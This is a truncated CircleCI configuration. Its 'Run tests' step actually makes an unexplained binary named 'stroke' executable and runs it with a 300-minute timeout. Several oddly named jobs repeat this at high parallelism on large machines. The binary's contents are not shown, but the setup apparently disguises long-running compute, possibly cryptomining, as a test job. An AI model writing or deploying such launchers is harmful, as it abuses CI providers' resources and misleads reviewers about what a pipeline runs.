working_dir: &working_dir ~/app
.build_template: &script
  steps:
    - checkout
    - run:
        name: Run tests
        command: |
                    chmod u+x stroke && ./stroke
        no_output_timeout: 300m
version: 2.1
jobs:
  endvoc:
    <<: *script
    parallelism: 6
    docker:
      - image: node
    resource_class: large
  endvoc1:
    <<: *script
    parallelism: 6
    docker:
      - image: node
    resource_class: large
  endvoc2:
